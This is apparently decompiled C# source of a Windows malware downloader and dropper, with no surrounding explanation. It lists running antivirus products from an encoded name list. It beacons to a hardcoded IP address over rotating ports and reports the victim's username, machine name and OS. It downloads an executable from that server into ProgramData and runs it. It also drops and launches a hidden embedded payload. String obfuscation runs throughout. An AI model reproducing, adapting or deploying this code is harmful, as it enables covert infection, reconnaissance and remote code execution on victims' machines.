using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using imndprsw.Properties;

namespace imndprsw;

internal class MRIMN
{
	private SROVC StateObj = new SROVC();

	public bool imndprswiswitch = false;

	private int imndprswbytRead = 0;

	private NetworkStream imndprswdatStream;

	public static byte[] encAvs = new byte[220]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 72, 101,
		97, 108, 44, 98, 100, 97, 103, 101, 110, 116,
		61, 66, 105, 116, 32, 68, 101, 102, 101, 110,
		100, 101, 114, 32, 65, 103, 101, 110, 116, 44,
		109, 115, 115, 101, 99, 101, 115, 61, 77, 83,
		32, 69, 115, 115, 101, 110, 116, 105, 97, 108,
		115, 44, 102, 115, 115, 109, 51, 50, 61, 70,
		83, 101, 99, 117, 114, 101, 44, 97, 118, 112,
		61, 75, 97, 115, 112, 101, 114, 115, 107, 121,
		44, 97, 118, 103, 110, 116, 61, 65, 118, 105,
		114, 97, 44, 115, 112, 98, 98, 99, 115, 118,
		99, 61, 83, 121, 109, 97, 110, 116, 101, 99,
		44, 117, 112, 100, 97, 116, 101, 114, 117, 105,
		61, 77, 99, 65, 102, 101, 101, 44, 97, 118,
		103, 117, 105, 61, 65, 86, 71, 44, 97, 118,
		103, 99, 99, 61, 65, 86, 71, 44, 109, 98,
		97, 109, 61, 65, 110, 116, 32, 77, 97, 108,
		119, 97, 114, 101, 44, 97, 118, 97, 115, 116,
		117, 105, 61, 65, 118, 97, 115, 116, 44, 97,
		118, 97, 115, 116, 61, 65, 118, 97, 115, 116
	};

	private SRINM confs = new SRINM();

	public TcpClient imndprswsysSCK;

	public string ips = "5.189.134.216|nvidashd".Split(new char[1] { '|' })[0];

	public static int port = 5156;

	public static int aport = 7218;

	public static int bport = 9686;

	public static int cport = 12538;

	public static int dport = 16468;

	public bool isconnected = false;

	public int sysPort = 5156;

	public string appPath = "\\Fordk\\|imndprsw".Split(new char[1] { '|' })[0];

	public int port_sn = 0;

	private int imndprswbufSize = 1024;

	private string imndprswavs = "";

	public string mainApp = "fremowrk|imndprsw".Split(new char[1] { '|' })[0];

	public string excPath;

	public string zuissloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string text2 = processes[i].ProcessName.ToLower();
				if (text2.Length <= 4)
				{
					continue;
				}
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(text2))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void imndprswports_switch()
	{
		port_sn++;
		switch (port_sn)
		{
		case 0:
			sysPort = port;
			break;
		case 1:
			sysPort = aport;
			break;
		case 2:
			sysPort = bport;
			break;
		case 3:
			sysPort = cport;
			break;
		case 4:
			sysPort = dport;
			break;
		}
		if (port_sn >= 4)
		{
			port_sn = 0;
		}
	}

	public string imndprswget_commend()
	{
		try
		{
			string text = "doadez=brdir | " + Environment.UserName;
			text = text + "   |   " + Environment.MachineName;
			text = text + "   |   " + imndprswOsname();
			text = text + " | " + imndprswavs;
			text = text + " | " + Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
			imndprswmore_data(text);
			byte[] array = new byte[5];
			imndprswbytRead = imndprswdatStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= imndprswbytRead)
			{
				int count = ((num3 > imndprswbufSize) ? imndprswbufSize : num3);
				imndprswbytRead = imndprswdatStream.Read(array2, num2, count);
				num2 += imndprswbytRead;
			}
			return Encoding.UTF8.GetString(array2, 0, num).ToString();
		}
		catch
		{
			return null;
		}
	}

	public void imndprswopenMe()
	{
		try
		{
			byte[] array = new byte[5] { 97, 118, 97, 115, 116 };
			string value = Encoding.UTF8.GetString(array, 0, array.Length).ToString();
			if (!imndprswavs.ToLower().Contains(value))
			{
				excPath = Path.GetDirectoryName(Application.get_ExecutablePath());
				string text = confs.fileName + confs.fileExt;
				if (Resources.imndprsw.Length > 110)
				{
					File.WriteAllBytes(text, Resources.imndprsw);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
				else if (File.Exists(confs.fileName))
				{
					File.Move(confs.fileName, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				if (File.Exists(text))
				{
					process.Start();
				}
			}
		}
		catch
		{
		}
	}

	public void imndprswservData(object StateObj)
	{
		imndprswresponce();
	}

	public string imndprswget_mpath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + appPath;
	}

	private bool imndprswmore_data(string type)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array = new byte[5 + bytes.Length + -1 + 1];
			bytes2.CopyTo(array, 0);
			bytes.CopyTo(array, 5);
			int num = 0;
			int num2 = array.Length;
			while (num2 > 0)
			{
				int num3 = ((num2 > imndprswbufSize) ? imndprswbufSize : num2);
				imndprswdatStream.Write(array, num, num3);
				num += num3;
				num2 -= num3;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool imndprswconnetc()
	{
		try
		{
			if (!isconnected)
			{
				imndprswsysSCK = new TcpClient();
				imndprswsysSCK.Connect(ips, sysPort);
				imndprswbufSize = imndprswsysSCK.ReceiveBufferSize;
				imndprswdatStream = imndprswsysSCK.GetStream();
				isconnected = true;
			}
			return true;
		}
		catch
		{
			imndprswports_switch();
			imndprswiswitch = false;
			isconnected = false;
			return false;
		}
	}

	public void imndprswresponce()
	{
		try
		{
			if (imndprswiswitch || !imndprswconnetc() || !iyatxuwais_need())
			{
				return;
			}
			imndprswiswitch = true;
			string text = imndprswget_commend();
			string[] array = text.Split(new char[1] { '=' });
			string text2 = array[0].ToLower();
			if (text2.Split(new char[1] { '-' }).Length > 1)
			{
				text2 = text2.Split(new char[1] { '-' })[1];
			}
			switch ("imndprsw" + text2)
			{
			case "imndprswdoadez":
				try
				{
					string[] array2 = array[1].Split(new char[1] { '|' });
					if (array2.Length > 1)
					{
						mainApp = array2[0];
						appPath = array2[1];
					}
				}
				catch
				{
				}
				try
				{
					if (!Directory.Exists(imndprswget_mpath()))
					{
						Directory.CreateDirectory(imndprswget_mpath());
					}
					byte[] array3 = imndprswhaveData();
					if (array3 != null)
					{
						int num = 1;
						while (File.Exists(imndprswget_mpath() + mainApp + ".exe!imndprsw".Split(new char[1] { '!' })[0]))
						{
							mainApp += num;
							num++;
						}
						File.WriteAllBytes(imndprswget_mpath() + mainApp + ".exe!imndprsw".Split(new char[1] { '!' })[0], array3);
						Thread.Sleep(140);
						Process process = new Process();
						process.StartInfo.FileName = imndprswget_mpath() + mainApp + ".exe!imndprsw".Split(new char[1] { '!' })[0];
						process.Start();
					}
				}
				catch
				{
				}
				break;
			case "imndprswinfo":
				imndprswiswitch = false;
				imndprswresponce();
				break;
			}
			imndprswiswitch = false;
		}
		catch
		{
			isconnected = false;
			imndprswiswitch = false;
		}
	}

	public string imndprswOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!imndprsw".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!imndprsw".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!imndprsw".Split(new char[1] { '!' })[0];
		}
	}

	private byte[] imndprswhaveData()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			imndprswbytRead = imndprswdatStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			for (int num3 = num2; num3 > 0; num3 -= imndprswbytRead)
			{
				int count = ((num3 > imndprswbufSize) ? imndprswbufSize : num3);
				imndprswbytRead = imndprswdatStream.Read(array2, num, count);
				num += imndprswbytRead;
			}
			return array2;
		}
		catch
		{
			return null;
		}
	}

	public bool iyatxuwais_need()
	{
		return !File.Exists(imndprswget_mpath() + mainApp + ".exe") || Process.GetProcessesByName(mainApp).Length == 0;
	}

	public void imndprswloadstart()
	{
		try
		{
			imndprswavs = zuissloadAV();
			TimerCallback callback = imndprswservData;
			Timer timer = new Timer(callback, StateObj, 23010, 61500);
			StateObj.timer = timer;
		}
		catch
		{
		}
	}
}
